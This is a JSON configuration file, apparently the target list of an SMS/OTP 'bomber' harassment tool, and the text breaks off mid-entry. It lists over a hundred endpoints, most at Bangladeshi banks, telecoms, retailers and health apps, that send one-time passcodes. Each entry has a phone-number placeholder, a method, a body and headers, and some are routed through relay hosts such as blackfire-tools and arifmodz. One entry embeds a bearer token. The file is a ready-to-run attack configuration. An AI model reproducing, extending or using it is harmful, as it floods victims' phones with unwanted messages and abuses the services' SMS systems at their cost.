{
  "info": "Get latest APIs from <https://proxy.neopandora.com/v1.json>",
  "apis": [
    {
        "id": "1",
        "name": "QuizGiri",
        "url": "https:\/\/developer.quizgiri.xyz\/api\/v2.0\/send-otp?phone=*****&country_code=+880&fcm_token=null",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "4",
        "name": "Shudokko",
        "url": "http:\/\/lpin.dev.mpower-social.com:6001\/usermodule\/otp_mobile\/?mobile_no=*****&email=xbomber_public%40gmail.com&verification_type=registration",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "5",
        "name": "Web Access",
        "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
        "method": "post",
        "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}",
        "headers": {
            "content-type": "application\/json",
            "content-length": "48"
        }
    },
    {
        "id": "6",
        "name": "CINESPOT",
        "url": "http:\/\/www.cinespot.mobi\/api\/cinespot\/v1\/otp\/sms\/mobile-*****\/operator-All\/send",
        "method": "GET",
        "body": "",
        "wait_time": 0,
        "identifier": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "7",
        "name": "Dhaka bank",
        "url": "https:\/\/ezybank.dhakabank.com.bd\/VerifIDExt2\/api\/CustOnBoarding\/VerifyMobileNumber",
        "method": "post",
        "body": "{\r\n  \"AccessToken\": \"\",\r\n  \"TrackingNo\": \"\",\r\n  \"mobileNo\": \"*****\",\r\n  \"otpSms\": \"\",\r\n  \"product_id\": \"250\",\r\n  \"requestChannel\": \"MOB\",\r\n  \"trackingStatus\": 5\r\n}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "8",
        "name": "CIRCLE",
        "url": "https:\/\/circle.robi.com.bd\/mylife\/gateway\/register_fcm.php?regId&msisdn=88*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "9",
        "name": "Health Plus 2",
        "url": "http:\/\/45.114.85.19:8080\/v3\/otp\/send?msisdn=88*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "10",
        "name": "IQRA",
        "url": "http:\/\/apibeta.iqra-live.com\/api\/v2\/sent-otp\/*****",
        "method": "get",
        "body": "",
        "headers": {
            "x-user-channel": "apps"
        }
    },
    {
        "id": "11",
        "name": "Shajgoj",
        "url": "https:\/\/bk.shajgoj.com\/api\/customers\/send-otp",
        "method": "post",
        "body": "{\"phone\":\"*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "12",
        "name": "KhaoDao",
        "url": "https:\/\/api.eat-z.com\/auth\/customer\/signin",
        "method": "post",
        "body": "{\"username\":\"+88*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "13",
        "name": "ALESHA_CARD",
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=*****",
        "method": "post",
        "body": "{\"phone\":\"*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "14",
        "name": "TheMallBD",
        "url": "https:\/\/themallbd.com\/api\/auth\/otp_login",
        "method": "post",
        "body": "{\"phone_number\":\"+88*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "15",
        "name": "Web Access",
        "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
        "method": "post",
        "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}",
        "headers": {
            "content-type": "application\/json",
            "content-length": "48"
        }
    },
    {
        "id": "16",
        "name": "Fundesh",
        "url": "https:\/\/win.fundesh.com.bd\/authSrv\/auth\/generateOtp",
        "method": "post",
        "body": "{\r\n  \"msisdn\": \"*****\",\r\n  \"clientId\": \"d2c_client\"\r\n}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "17",
        "name": "Circle",
        "url": "https:\/\/circle.robi.com.bd\/mylife\/appapi\/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "18",
        "name": "Vestige",
        "url": "http:\/\/vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com\/notification\/api\/v1\/send\/otp\/v3",
        "method": "post",
        "body": "{\"mobileNumber\":\"88*****\",\"countryId\":22}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "19",
        "name": "Ajkerdeal",
        "url": "https:\/\/api.ajkerdeal.com\/Recover\/RetrivePassword\/customersignup=null",
        "method": "post",
        "body": "{\"CustomerId\": \"01833268701\",\"MobileOrEmail\":\"*****\", \"Type\": 2}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "20",
        "name": "Dhaka bank",
        "url": "https:\/\/ezybank.dhakabank.com.bd\/VerifIDExt2\/api\/CustOnBoarding\/VerifyMobileNumber",
        "method": "post",
        "body": "{\r\n  \"AccessToken\": \"\",\r\n  \"TrackingNo\": \"\",\r\n  \"mobileNo\": \"*****\",\r\n  \"otpSms\": \"\",\r\n  \"product_id\": \"250\",\r\n  \"requestChannel\": \"MOB\",\r\n  \"trackingStatus\": 5\r\n}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "21",
        "name": "Arogga",
        "url": "https:\/\/api.arogga.com\/v1\/auth\/sms\/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0",
        "method": "post",
        "body": "mobile=+88*****&fcmToken=&referral=",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "22",
        "name": "OsudPotro",
        "url": "https:\/\/api-2.osudpotro.com\/api\/v1\/users\/send_otp",
        "method": "post",
        "body": "{\"mobile\":\"+88-*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "23",
        "name": "Web Access",
        "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
        "method": "post",
        "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "24",
        "name": "Shajgoj",
        "url": "https:\/\/shop.shajgoj.com\/wp-admin\/admin-ajax.php",
        "method": "post",
        "body": "action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=3563&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F%3Ffbclid%3DIwAR2mUXNZgDYWrrONUqp61_3Ac4vtnaZUUcBUVwFVTjqgymp5x_2i0nULH_k",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "25",
        "name": "Nesco",
        "url": "http:\/\/nesco.sslwireless.com\/api\/v1\/login",
        "method": "post",
        "body": "phone_number=*****",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "26",
        "name": "ROBI WEB",
        "url": "https:\/\/webapi.robi.com.bd\/v1\/send-otp",
        "method": "post",
        "body": "{\"phone_number\":\"*****\"}",
        "headers": {
            "content-type": "application\/json",
            "Authorization": " Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"
        }
    },
    {
        "id": "27",
        "name": "Shajgoj 2",
        "url": "https:\/\/shop.shajgoj.com\/wp-admin\/admin-ajax.php",
        "method": "post",
        "body": "action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=3490&xoo-ml-form-type=login_user_with_otp&redirect=%252Fmy-account%252F&=",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "28",
        "name": "Bongo",
        "url": "https:\/\/api.bongo-solutions.com\/auth\/api\/login\/send-otp",
        "method": "post",
        "body": "{\"operator\":\"all\",\"msisdn\":\"88*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "29",
        "name": "Cinematic",
        "url": "https:\/\/api.mygp.cinematic.mobi\/api\/v1\/send-common-otp\/88*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json",
            "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
        }
    },
    {
        "id": "30",
        "name": "Ali2BD",
        "url": "https:\/\/edge.ali2bd.com\/api\/consumer\/v1\/auth\/login",
        "method": "post",
        "body": "{\"username\":\"+88*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "31",
        "name": "Admissionbd",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/admissionbd.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "32",
        "name": "Ali2bd",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/ali2bd.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "33",
        "name": "AppLink",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/applink.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "34",
        "name": "Arogga",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/arogga.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "35",
        "name": "Bikroy",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/bikroy.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "36",
        "name": "MuBl",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/bl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "37",
        "name": "ChainaOnline",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/chainaonline.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "38",
        "name": "Chokrojan",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/chakrajan.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "39",
        "name": "Chorki",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/chorki.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "40",
        "name": "Circle",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/circel.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "41",
        "name": "DhakaBank",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/dhakabank.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "42",
        "name": "Deepto",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/dipto.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "43",
        "name": "Doctime",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/doctime.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "44",
        "name": "Easy.com",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/easy.com.bd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "45",
        "name": "Ecourier",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/ecuriar.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "46",
        "name": "Flexiplan",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/flexi-plan.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "47",
        "name": "Fliper",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/fliper.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "48",
        "name": "Fundedh",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/fundesh.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "49",
        "name": "Ghuri",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/ghuri.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "50",
        "name": "Gpoffer",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/gp.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "51",
        "name": "Gpshop",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/gpshop.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "52",
        "name": "HishabExp",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/hisab-express.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "53",
        "name": "HishabLogin",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/hisabelogin.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "54",
        "name": "Ivr",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/ivr.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "55",
        "name": "Jeetwinbd",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/jeetwinbd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "56",
        "name": "Jotno",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/jotno.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "57",
        "name": "Mcb",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/mcbaffiliate.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "58",
        "name": "Mokam",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/mokam.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "59",
        "name": "Moveon",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/moveon.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "60",
        "name": "Obhai",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/obhai.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "61",
        "name": "Robinyoffer",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/robi-myoffer.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "62",
        "name": "Robiweb",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/robi-web.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "63",
        "name": "Robiweb2",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/robi-web2.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "64",
        "name": "Rtvreg",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/rtv-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "65",
        "name": "Rtvlogin",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/rtv-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "66",
        "name": "Shadhin",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/sadhin.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "67",
        "name": "Sajgoj",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/sajgoj.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "68",
        "name": "Shopotreg",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/sopoth-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "69",
        "name": "Shopotlog",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/sopoth-resend.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "70",
        "name": "Tallykhata",
        "url": "https:\/\/api.arifmodz.my.id\/V2\/talikhata.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "71",
        "name": "Bkash",
        "url": "https:\/\/www.sineorbiz.com\/wp-content\/plugins\/bkash.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "72",
        "name": "Castomis Api",
        "url": "https:\/\/www.tokaweb.xyz\/sms.php?number=*****&sms=Hi Good Morning",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "73",
        "name": "Rabbitholebd",
        "url": "https:\/\/apix.rabbitholebd.com\/appv2\/login\/requestOTP",
        "method": "post",
        "body": "{\"mobile\":\"*****\"}",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "74",
        "name": "osudpotro",
        "url": "https:\/\/api.osudpotro.com\/api\/v1\/users\/send_otp",
        "method": "post",
        "body": "{\"mobile\":\"+88*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "75",
        "name": "Shopoth",
        "url": "https:\/\/api.shopoth.com\/shop\/api\/v1\/otps\/send",
        "method": "post",
        "body": "{\"phone\":\"*****\"}",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "76",
        "name": "AProd",
        "url": "https:\/\/prod-api.viewlift.com\/identity\/signup?site=hoichoitv",
        "method": "post",
        "body": "{\"requestType\":\"send\",\"phoneNumber\":\"+88*****\",\"emailConsent\":true,\"whatsappConsent\":true}",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "77",
        "name": "Go App",
        "url": "https:\/\/go-app.paperfly.com.bd\/merchant\/api\/react\/registration\/request_registration.php",
        "method": "-- Select Method --",
        "body": "{\"full_name\":\"BLACKFIRE\",\"company_name\":\"Bomber\",\"email_address\":\"blactfiretools@gmail.com\",\"phone_number\":\"*****\"}",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "78",
        "name": "8m-forget.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/8m-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "79",
        "name": "b8m-reg.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/b8m-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "80",
        "name": "admissionbd.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/admissionbd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "81",
        "name": "aibl.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/aibl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "82",
        "name": "ail2bd.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/ali2bd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "83",
        "name": "apex.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/apex.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "84",
        "name": "applink.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/applink.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "85",
        "name": "arogga.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/arogga.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "86",
        "name": "bdtikets.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bdtikets.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "87",
        "name": "bdtikets2.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bdtikets2.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "88",
        "name": "betonbook.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/betonbook.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "89",
        "name": "bikroy.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bikroy.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "90",
        "name": "bioscope.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bioscope.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "91",
        "name": "bjbaji.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bjbaji.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "92",
        "name": "bkash.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bkash.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "93",
        "name": "bl.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "94",
        "name": "bongobd.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/bongobd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "95",
        "name": "busbdlogin.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/busbdlogin.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "96",
        "name": "chainaonline.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/chainaonline.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "97",
        "name": "chakrajan.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/chakrajan.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "98",
        "name": "chorki.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/chorki.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "99",
        "name": "cinematic.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/cinematic.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "100",
        "name": "cineplex.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/cineplex.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "101",
        "name": "cinespot.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/cinespot.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "102",
        "name": "circel.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/circel.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "103",
        "name": "daktarbhai.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/daktarbhai.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "104",
        "name": "dhakabank.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/dhakabank.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "105",
        "name": "dipto.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/dipto.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "106",
        "name": "dmss.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/dmss.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "107",
        "name": "doctime.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/doctime.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "108",
        "name": "easy.com.bd",
        "url": "https:\/\/api.blackfire-tools.xyz\/easy.com.bd.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "109",
        "name": "ecuriar.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/ecuriar.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "110",
        "name": "engage-token.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/engage-token.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "111",
        "name": "engage.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/engage.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "112",
        "name": "enobazar.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/enobazar.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "113",
        "name": "entertainment.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/entertainment.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "114",
        "name": "eshop-bl.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/eshop-bl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "115",
        "name": "flexi-plan.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/flexi-plan.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "116",
        "name": "fliper.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/fliper.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "117",
        "name": "food-collection.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/food-collection.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "118",
        "name": "fsibl.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/fsibl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "119",
        "name": "fundesh.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/fundesh.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "120",
        "name": "ghuri.php",
        "url": "https:\/\/api.blackfire-tools.xyz\/ghuri.php?phone=*****",
        "method": "get",
        "body": "",
